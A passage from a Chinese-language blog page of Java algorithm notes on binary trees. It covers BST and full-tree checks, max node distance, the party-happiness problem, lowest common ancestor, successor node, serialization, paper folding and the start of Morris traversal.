class="token punctuation">.</span>max<span class="token punctuation">,</span> max<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rData <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        min <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>rData<span class="token punctuation">.</span>min<span class="token punctuation">,</span> min<span class="token punctuation">)</span><span class="token punctuation">;</span>        max <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>rData<span class="token punctuation">.</span>max<span class="token punctuation">,</span> max<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">boolean</span> isBST <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>lData <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> isBST <span class="token operator">=</span> lData<span class="token punctuation">.</span>isBST <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>lData<span class="token punctuation">.</span>max <span class="token operator">&lt;</span> head<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rData <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> isBST <span class="token operator">=</span> isBST <span class="token operator">&amp;&amp;</span> rData<span class="token punctuation">.</span>isBST <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>rData<span class="token punctuation">.</span>min <span class="token operator">></span> head<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnData</span><span class="token punctuation">(</span>isBST<span class="token punctuation">,</span> max<span class="token punctuation">,</span> min<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="判断满二叉树"><a href="#判断满二叉树" class="headerlink" title="判断满二叉树"></a>判断满二叉树</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> returnData<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> height<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> nodes<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">returnData</span><span class="token punctuation">(</span><span class="token keyword">int</span> h<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>height <span class="token operator">=</span> h<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>nodes <span class="token operator">=</span> n<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">isFullBT</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    returnData res <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> res<span class="token punctuation">.</span>height<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">==</span> res<span class="token punctuation">.</span>nodes<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> returnData <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnData</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    returnData lData <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    returnData rData <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnData</span><span class="token punctuation">(</span><span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>lData<span class="token punctuation">.</span>height<span class="token punctuation">,</span> rData<span class="token punctuation">.</span>height<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> lData<span class="token punctuation">.</span>nodes <span class="token operator">+</span> rData<span class="token punctuation">.</span>nodes <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="二叉树节点间最大距离"><a href="#二叉树节点间最大距离" class="headerlink" title="二叉树节点间最大距离"></a>二叉树节点间最大距离</h4><p>从二叉树的节点a出发，可以向上或者向下走，但沿途的节点只能经过一次，到达节点b时路径上的节点个数叫作a到b的距离，那么二叉树任何两个节点之间都有距离，求整棵树上的最 大距离</p><p>想得到以x为根节点的树的最大距离，该距离分为两种情况</p><p>1）距离经过了x（x参与），那么想得到最大距离就必须是左子树高度+1+右子树高度</p><p>2）距离不经过x（x不参与），要么是左子树的最大距离，要么是右子树的最大距离</p><p>那么我们需要子树提供的信息就是：</p><p>1）子树的最大距离，2）子树的高度</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> returnData<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> height<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> distance<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">returnData</span><span class="token punctuation">(</span><span class="token keyword">int</span> h<span class="token punctuation">,</span> <span class="token keyword">int</span> d<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        height <span class="token operator">=</span> h<span class="token punctuation">;</span>        distance <span class="token operator">=</span> d<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">maxDistance</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">.</span>distance<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> returnData <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Node</span> node<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>node <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnData</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    returnData left <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    returnData right <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> dis <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>left<span class="token punctuation">.</span>distance<span class="token punctuation">,</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>right<span class="token punctuation">.</span>distance<span class="token punctuation">,</span> left<span class="token punctuation">.</span>height <span class="token operator">+</span> right<span class="token punctuation">.</span>height <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> hei <span class="token operator">=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>left<span class="token punctuation">.</span>height<span class="token punctuation">,</span> right<span class="token punctuation">.</span>height<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnData</span><span class="token punctuation">(</span>hei<span class="token punctuation">,</span> dis<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="最大快乐值（多叉树）"><a href="#最大快乐值（多叉树）" class="headerlink" title="最大快乐值（多叉树）"></a>最大快乐值（多叉树）</h4><p>员工信息的定义如下: </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Employee</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token keyword">int</span> happy<span class="token punctuation">;</span> <span class="token comment">// 这名员工可以带来的快乐值 </span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> subordinates<span class="token punctuation">;</span> <span class="token comment">// 这名员工有哪些直接下级 </span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>公司的每个员工都符合 Employee 类的描述。整个公司的人员结构可以看作是一棵标准的、 没有环的多叉树。树的头节点是公司唯一的老板。除老板之外的每个员工都有唯一的直接上级。 叶节点是没有任何下属的基层员工(subordinates列表为空)，除基层员工外，每个员工都有一个或多个直接下级。 </p><p>这个公司现在要办party，你可以决定哪些员工来，哪些员工不来。但是要遵循如下规则</p><p>1）如果某个员工来了，那么这个员工的所有直接下级都不能来 </p><p>2）派对的整体快乐值是所有到场员工快乐值的累加 </p><p>3）你的目标是让派对的整体快乐值尽量大 </p><p>给定一棵多叉树的头节点boss，请返回派对的最大快乐值</p><p>想得到以x为根节点的树的最大快乐值，同样分为两种情况：</p><p>1）x参与，快乐值为x.happy + {所有直接下级不来的整颗子树的最大快乐值}</p><p>2）x不参与，快乐值为0 + {所有直接下级max(直接下级来的整颗子树的最大值，直接下级不来的整颗子树的最大值)}</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">class</span> returnData<span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> present<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> absent<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">returnData</span><span class="token punctuation">(</span><span class="token keyword">int</span> p<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        present <span class="token operator">=</span> p<span class="token punctuation">;</span>        absent <span class="token operator">=</span> a<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">maxHappy</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> boss<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        returnData bos <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>boss<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>bos<span class="token punctuation">.</span>present<span class="token punctuation">,</span> bos<span class="token punctuation">.</span>absent<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> returnData <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> employee<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Employee</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> employee<span class="token punctuation">.</span>subordinates<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>list<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnData</span><span class="token punctuation">(</span>employee<span class="token punctuation">.</span>happy<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> p <span class="token operator">=</span> employee<span class="token punctuation">.</span>happy<span class="token punctuation">;</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Employee</span> each<span class="token operator">:</span>list<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        returnData emplo <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>        p <span class="token operator">+=</span> emplo<span class="token punctuation">.</span>absent<span class="token punctuation">;</span>        a <span class="token operator">+=</span> <span class="token class-name">Math</span><span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>emplo<span class="token punctuation">.</span>present<span class="token punctuation">,</span> emplo<span class="token punctuation">.</span>absent<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token function">returnData</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="最低公共祖先节点"><a href="#最低公共祖先节点" class="headerlink" title="最低公共祖先节点"></a>最低公共祖先节点</h3><p>给定两个二叉树的节点node1和node2，找到他们的最低公共祖先节点</p><p>如果有公共祖先，只有下面两种情况</p><p>1）node1和node2，其中一个是另一个的祖先</p><p>2）都往上找，找到一个节点为公共祖先</p><p>使用递归遍历整棵树（代码不好理解）</p><p>base case：当前节点为空/node1/node2，返回当前节点</p><p>递归左右子树，然后如果两侧的结果都不为空的话，说明是情况 2），将当前节点往上层返回即可，否则说明至少有一侧为空，那么返回不为空的那一侧即可（两侧都为空，返回空）</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">lowestCommonAncestor</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">,</span> <span class="token class-name">Node</span> o1<span class="token punctuation">,</span> <span class="token class-name">Node</span> o2<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> head <span class="token operator">==</span> o1 <span class="token operator">||</span> head <span class="token operator">==</span> o2<span class="token punctuation">)</span> <span class="token keyword">return</span> head<span class="token punctuation">;</span>    <span class="token class-name">Node</span> left <span class="token operator">=</span> <span class="token function">lowestCommonAncestor</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">,</span> o1<span class="token punctuation">,</span> o2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> right <span class="token operator">=</span> <span class="token function">lowestCommonAncestor</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">,</span> o1<span class="token punctuation">,</span> o2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>left <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> right <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> head<span class="token punctuation">;</span>    <span class="token keyword">return</span> left <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> left <span class="token operator">:</span> right<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="后继节点"><a href="#后继节点" class="headerlink" title="后继节点"></a>后继节点</h3><p>即中序遍历中的下一个节点</p><p>节点类型添加了一个指向父节点的指针，根节点的父节点为null</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> value<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> left<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> right<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span> parent<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        value <span class="token operator">=</span> val<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然题意并不想让我们中序遍历整棵树，从而得出后继节点，这样的复杂度是O（n），但是有了父节点的帮助，我们可以优化到O（k），k为该节点与后继节点的高度差</p><p>这就需要我们理解树的结构，节点分为两种情况</p><p>1）该节点有右子树 - 返回右子树的最左边的子节点</p><p>2）无右子树 - 向上找，如果不是父亲的左孩子，继续向上，找到第一个是父亲的左孩子为止，那么该父亲即为后继节点</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">successorNode</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">,</span> <span class="token class-name">Node</span> node<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> node <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> cur <span class="token operator">=</span> node<span class="token punctuation">.</span>right<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cur <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span>left <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> cur <span class="token operator">=</span> cur<span class="token punctuation">.</span>left<span class="token punctuation">;</span>        <span class="token keyword">return</span> cur<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">Node</span> par <span class="token operator">=</span> node<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>    cur <span class="token operator">=</span> node<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>par <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> par<span class="token punctuation">.</span>left <span class="token operator">!=</span> cur<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        cur <span class="token operator">=</span> par<span class="token punctuation">;</span>        par <span class="token operator">=</span> par<span class="token punctuation">.</span>parent<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> par<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二叉树序列化"><a href="#二叉树序列化" class="headerlink" title="二叉树序列化"></a>二叉树序列化</h3><p>序列化为一个字符串，先序中序后序按层都可以，道理一样，以下划线分割，null则记为”#”</p><p>这里采用先序遍历</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">serial</span><span class="token punctuation">(</span><span class="token class-name">Node</span> head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token string">"#_"</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> left <span class="token operator">=</span> <span class="token function">serial</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>left<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> right <span class="token operator">=</span> <span class="token function">serial</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span>right<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> head<span class="token punctuation">.</span>value <span class="token operator">+</span> <span class="token string">"_"</span> <span class="token operator">+</span> left <span class="token operator">+</span> right<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>反序列化的思路就是先将该字符串按下划线分开，全部放到队列中，然后按照出队顺序构建整棵树</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">unserial</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nodes <span class="token operator">=</span> str<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> que <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">LinkedList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">String</span> each<span class="token operator">:</span>nodes<span class="token punctuation">)</span> que<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>each<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">process</span><span class="token punctuation">(</span>que<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Node</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token class-name">Queue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> q<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">String</span> cur <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">poll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>cur<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token class-name">Node</span> head <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Node</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>cur<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span>left <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token punctuation">.</span>right <span class="token operator">=</span> <span class="token function">process</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> head<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="折纸问题"><a href="#折纸问题" class="headerlink" title="折纸问题"></a>折纸问题</h3><blockquote><p> 一段长纸条，从下边向上方对折1次，压出折痕后展开。此时折痕是凹下去的，即折痕突起的方向指向纸条的背面。如果从纸条的下边向上方连续对折2次，压出折痕后展开，此时有三条折痕，从 上到下依次是下折痕、下折痕和上折痕。</p><p>给定一个输入参数N，代表纸条都从下边向上方连续对折N次。 请从上到下打印所有折痕的方向。 例如:N=1时，打印: down N=2时，打印: down down up</p></blockquote><p>对折纸条的过程中，从第一条折痕开始，折第二次时，第一条折痕上侧出现down，下侧出现up，折第三次时，第二条位于上侧的折痕上侧出现down，下侧出现up，第二条位于下侧的折痕同理，形成一个规律，这个规律构建了一棵假想的二叉树，对该树进行中序遍历即为答案</p><p><img src="https://cdn.jsdelivr.net/gh/ezy0812/CDN/zuoshen-algorithm/algorithm2_f2.png"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">paperFold</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">process</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// down - true 凹 false 凸</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span> level<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">boolean</span> down<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>level <span class="token operator">></span> n<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span>level <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>down <span class="token operator">?</span> <span class="token string">"down "</span> <span class="token operator">:</span> <span class="token string">"up "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">process</span><span class="token punctuation">(</span>level <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Morris遍历"><a href="#Morris遍历" class="headerlink" title="Morris遍历"></a>Morris遍历</h3><p>一种遍历二叉树的方式，并且时间复杂度O(N)，额外空间复杂度O(1) </p><p>通过利用原树中大量空闲指针的方式，达到节省空间的目的</p><p>Morris遍历细节 </p><p>假设来到当前节点cur，开始时cur来到头节点位置 </p><p>1）如果cur没有左孩子，cur向右移动(cur = cur.right) </p><p>2）如果cur有左孩子，找到左子树上最右的节点mostRight： </p><ul><li><p>如果mostRight的右指针指向空，让其指向cur， 然后cur向左移动(cur = cur.left) </p></li><li><p>如果mostRight的右指针指向cur，让其指向null， 然后cur向右移动(cur = cur.right) </p></li></ul><p>3）cur为空时遍历停止</p><blockquote><p>有左子树的节点可以回到该节点两次，没有左子树的节点只能到达1次</p><p>有左子树的节点可以根据左子树的最右节点的指向来判断第几次到达该节点，指向自己就是第二次</p></blockquote><pre class="line-numbers language-java" 